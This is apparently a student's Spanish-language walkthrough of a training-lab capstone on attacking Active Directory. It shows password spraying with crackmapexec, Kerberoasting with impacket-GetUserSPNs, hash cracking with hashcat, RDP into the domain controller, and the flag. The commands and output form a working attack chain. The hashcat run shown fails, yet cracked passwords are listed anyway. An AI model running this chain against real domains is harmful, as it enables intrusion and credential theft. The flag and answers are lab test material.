# Walk: Attacking Active Directory Authentication - VM Group 3 

## Objetivo
Capstone Exercise: Once VM Group 3 is started, the domain corp.com has been modified. 
By examining leaked password database sites, you discovered that the password VimForPowerShell123! was previously used by a domain user. 
Spray this password against the domain users meg and backupuser. Once you have identified a valid set of credentials, 
use the techniques from this Module to obtain access to the domain controller. 
You'll find the flag on the Desktop of the domain administrator on DC1. 
If you obtain a hash to crack, reuse the rule file from the previous exercise.
## Herramientas
1. crackmapexec 
2. impacket-GetUserSPNs
3. hashcat

## Procedimiento y comandos
#### Paso 1: Propagamos credencales:
* SMB
```bash
┌──(root㉿kali)-[/home/…/OffSec/23-ActiveDirectory-Attacks/Capstones/lab-2]
└─# crackmapexec smb 192.168.230.70-75 -u users.txt -p "VimForPowerShell123\!" --continue-on-success
SMB         192.168.230.74  445    CLIENT74         [*] Windows 11 Build 22000 x64 (name:CLIENT74) (domain:corp.com) (signing:False) (SMBv1:False)
SMB         192.168.230.73  445    FILES04          [*] Windows Server 2022 Build 20348 x64 (name:FILES04) (domain:corp.com) (signing:False) (SMBv1:False)
SMB         192.168.230.72  445    WEB04            [*] Windows Server 2022 Build 20348 x64 (name:WEB04) (domain:corp.com) (signing:False) (SMBv1:False)
SMB         192.168.230.75  445    CLIENT75         [*] Windows 11 Build 22000 x64 (name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
SMB         192.168.230.74  445    CLIENT74         [+] corp.com\meg:VimForPowerShell123! 
SMB         192.168.230.74  445    CLIENT74         [-] corp.com\backupuser:VimForPowerShell123! STATUS_ACCOUNT_LOCKED_OUT 
SMB         192.168.230.72  445    WEB04            [+] corp.com\meg:VimForPowerShell123! 
SMB         192.168.230.72  445    WEB04            [-] corp.com\backupuser:VimForPowerShell123! STATUS_ACCOUNT_LOCKED_OUT 
SMB         192.168.230.73  445    FILES04          [+] corp.com\meg:VimForPowerShell123! 
SMB         192.168.230.73  445    FILES04          [-] corp.com\backupuser:VimForPowerShell123! STATUS_ACCOUNT_LOCKED_OUT 
SMB         192.168.230.75  445    CLIENT75         [+] corp.com\meg:VimForPowerShell123! 
SMB         192.168.230.75  445    CLIENT75         [-] corp.com\backupuser:VimForPowerShell123! STATUS_ACCOUNT_LOCKED_OUT 
```
* **winrm**

```bash

```
#### Paso 2: Obtenemos el hash
```bash
┌──(root㉿kali)-[/home/…/OffSec/23-ActiveDirectory-Attacks/Capstones/lab-2]
└─# impacket-GetUserSPNs -request corp.com/meg:"VimForPowerShell123\!" -dc-ip 192.168.230.70
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName    Name         MemberOf                                  PasswordLastSet             LastLogon                   Delegation    
----------------------  -----------  ----------------------------------------  --------------------------  --------------------------  -------------
HTTP/web04.corp.com     iis_service                                            2022-09-07 09:38:43.411468  2023-03-01 08:40:02.088156  unconstrained 
HTTP/web04              iis_service                                            2022-09-07 09:38:43.411468  2023-03-01 08:40:02.088156  unconstrained 
HTTP/web04.corp.com:80  iis_service                                            2022-09-07 09:38:43.411468  2023-03-01 08:40:02.088156  unconstrained 
http/files04.corp.com   backupuser   CN=Domain Admins,CN=Users,DC=corp,DC=com  2025-07-07 17:11:52.798450  <never>                                   



[-] CCache file is not found. Skipping...
$krb5tgs$23$*iis_service$CORP.COM$corp.com/iis_service*$1879bc9f819fb15bf86770c128a967bf$b622b9e4c3ca147cf480e1b9cc5907f1c35e4293b06324a87744130c1ade6b54b3472875486a455fd565f6af1c0a094dfdf7e49df5fcd28d91d7e8ba8087f2512107cc0e4674eafcc4d9ddf9641558b56252f625bcbf3c8522c24d08b048d9e57fd021f1e9a5c150df16c41496f253b02b060ede111107eaed528703defe448b39e5935d9d8842bfbaa9b00341516863c23867f1f4bcdfde569075754bb3e8d7d7bf29dd7e7a7d16874bab38fa4eb58fbb227b5b5d78295e63c46591d057e32e1362ac8ff4bc10fcbf0ea999373de86d08b28da081c675f5cf593a8e5ca4361c66eb0ce488037fa0bea316c69ee5d9e52774ec657ff369bf0e1f0fd51a2aa65249b901db32060479670709abb631b23006f4d3fe2bb5ea19f8e78e1502d198bbc996db4e356438fad9f108bd0760bf3f49840d6b2708a4786f623bce873257263f24265d00c3509b94c99486094d6ac47586183c9d0f98317a9934cd0304362ccd1f894e388fa82a78c5f1bd9fd777dca188ecb7dc34a2fe4d1717eeaac19b9ad6073551c17edcf92894842ef9f60fbb1e5537cfe67a5051ad9e1bad1165420c7f622737fd071ee2eaf07260c553e9c5606002d6d31282387f0e0fdc6bc4d5db88107dce8851e7cd9e10e52e23cf23147adcf00e574e934913e0b571f680f8b3948dc07150584ad924dc5717af7a2263bf2fa1ad71579b7d2ff9c02135a627ffc4f4295dbe7c455f70aee768492a782250e29ff2b1d9762afd32ae9f9c05e80f5a3a659aff48455e2b2bb81f5adb3b2e0e1ba44c2bba6be90277dd17dd2713376cb895a7410274e096c969a0d5e72f6eac4dd51f3d74a210ebef875d191ae92774e58570876ed010d15bcacd6007ccd823762a32a1f671beef2b8869a6b1adb4350805a85e6112c65cac7debfcf02190a2a988d1dcd16f91f78e6649ca3c9a18ac30a840feb7400a89d94c8ec26ff2ce569939bc2ffc22781dfbb6a77ee51fecd826403fbeca94788411241160bf88f3b89283bf5b51ce15ee6c20d6a56d6b9daafcda2babf0d70e63ca074ad0c9756160222d6462a28f0b62586d7ac54e8f9964245d8f6a9ea1e52d59fba410647a277734d46cde00739cc1883ce86507be42350420aad397f6c2102007b4483622b54dd55726af095cd9862ab6602f36283219b535bc4407ab75ac6b35ec015dc743439652ba07d26e21ca2d883f04c88d896e4030e68e8c648c93d1e9b6896911a2677f2ac292af70aaf30da5f65d196a09abe5477cf9835b7661699cf3fed84f4ef4a4b287df186bd2e73dc153
$krb5tgs$23$*backupuser$CORP.COM$corp.com/backupuser*$df7e0f66dc504fe2055aace99c049724$d92b0207d95adea832ef7b8d8951e1766bd6bbe9686a947e195ae7e70c99f42dcb351e7df053b948b50cff6666c2d9d7ae2737dc94c1af60bf46804e56acad763d9041fa3f67904a06b2a61a7574656936bf17d1c1effdb1768be50bd728df4960b789bb9e28d1a6bca11410e384fa7de26825b0326d7bfcf5b1dcd2e35547901628a524d254ec68f27ea046b37fb34f9971b5f0946814f68ddde09d929e692c97f912bed379cd7ffce16924344f2be70b2330af6c1fde61ce1818da973869f0039c5af4958a209f630092a3b8df364bdc788e2ee09fd78fc07fcf858a3c6e04ef5812df9f988b5c1f54df6a5adb17a7e26cc5c10d282a1b4d9ff707065197551dd79da04e451d00ecbf0cf3ea68be85e36f29dac106c3365b0fd06d5e0a0f09616dde032f80386c2dc31db1b2dd5be5015a8d7c7fc9b5888b2b116095a12c95e0b6d7f40303023e951146e8b5d1f14a672e96163a84c300f60e9e4713db32e533bd636ca755e7a0018f979ed5cd7e846f80c1ca288be57d3d6f713961616aeae63c791a62f266ef10997b5761fbf6a22e9b07b8237801c907761c7b3ca941bba61c4c2b6831be5f9e0dcf73c16b8281729d872888d106c4f1ef12f4781c372fc81d2510456b2155e4a2bc2b67e7958d57a667ac66d5b8d5771240c471ea28740ea87997741be2d396353451aa38ed8d20fb8f57ff0709cc0e90b7ab1121337738e6803312c4d64fd888c2100ff3bd3594b78b697c88adc9a8296d4ae49b37fe670e35dc8d14734d4e5c359f345a5be7f0130d99a9b2d6528bc8f71a90a9d980d6284ee25fc650f51bcf8b96916dfedc5260cc2ca2484813af817eb7b13009200cc7782a2b2497606c6077d8f0581d721e661ba6754c0dd2a0e3a474070e25816bdeafb331f1d6ae6410c036d8a32fe836d2e3da69efd65ce3415eddae8a3c0ac07137b5a9557c2fc4a47be856165b3a3887a4f6868e652da0dd72818290c3c35df839c213acf3f9b9197dd9b7d1ce907cedbf99d9f58e2b5c37920f724ba05bca67fed01f73d50a8507cb6bde39b4dc28026d089fce1bd0874e32d067a6c1cdbd6374a05fa82f0017e3b9306a0ccee2d8504618a611dd85453561aebaefefe42ad7a4cd0023c4249bec36cefb08073a1b74b32c6201d5840976337198f4afa5e5af697513d677cd8d336f4f363b12ec43ab7f90d8ad72607419bcd59b1cd3ea5f30e67f6928afd8e3843f6bc9b05e69f54b1ae3729808ea99a948a41943531cd20e3e7fd3eaed6dd1aa8f0be9634dcf2baf2117e73c94f8d372197e
```

* Crackeamos:

```bash

┌──(root㉿kali)-[/home/…/OffSec/23-ActiveDirectory-Attacks/Capstones/lab-2]
└─# hashcat -m 18200 -a 0 -r rules.rule hashes.asreproast /usr/share/wordlists/rockyou.txt -o cracked_asrep.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-skylake-avx512-Intel(R) Core(TM) i5-1035G1 CPU @ 1.00GHz, 14879/29823 MB (4096 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashfile 'hashes.asreproast' on line 1 ($krb5t...fed84f4ef4a4b287df186bd2e73dc153): Separator unmatched
Hashfile 'hashes.asreproast' on line 2 ($krb5t...e9634dcf2baf2117e73c94f8d372197e): Separator unmatched
No hashes loaded.

Started: Mon Jul  7 17:15:58 2025
Stopped: Mon Jul  7 17:15:58 2025
```

**Credenciales**

|user|password|
|----|--------|
|iis|Strawberry1|
|backupuser|DonovanJadeKnight1|

#### Paso 3: Obtenemos el flag
1. Entramos por rdp al **DC01**

```powershell
──(root㉿kali)-[/home/…/OffSec/23-ActiveDirectory-Attacks/Capstones/lab-2]
└─# xfreerdp /u:"backupuser" /p:'DonovanJadeKnight1' /v:192.168.230.70 /dynamic-resolution +clipboard /cert:ignore
[17:40:56:910] [8359:8360] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: America/Argentina/Buenos_Aires
[17:40:56:412] [8359:8360] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[17:40:56:412] [8359:8360] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[17:40:56:447] [8359:8360] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[17:40:56:447] [8359:8360] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[17:40:56:447] [8359:8360] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
[17:40:57:243] [8359:8360] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_FAILED_OTHER [LOGON_MSG_SESSION_CONTINUE]
```

2. Ejecutamos powershell como administrador:

```powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> cd C:\Users\Administrator
PS C:\Users\Administrator> cd Desktop
PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          7/7/2025   4:39 PM             38 flag.txt


PS C:\Users\Administrator\Desktop> type flag.txt
OS{87566264b9fe868d8e90c654b873763b}
PS C:\Users\Administrator\Desktop>
```

## Troubleshooting
## Herramientas Alternativas
- [ ] **Herramienta 1:** Descripción breve (Comando)
- [ ] **Herramienta 2:** Descripción breve (Comando)
- [ ] **Herramienta 3:** Descripción breve (Comando)

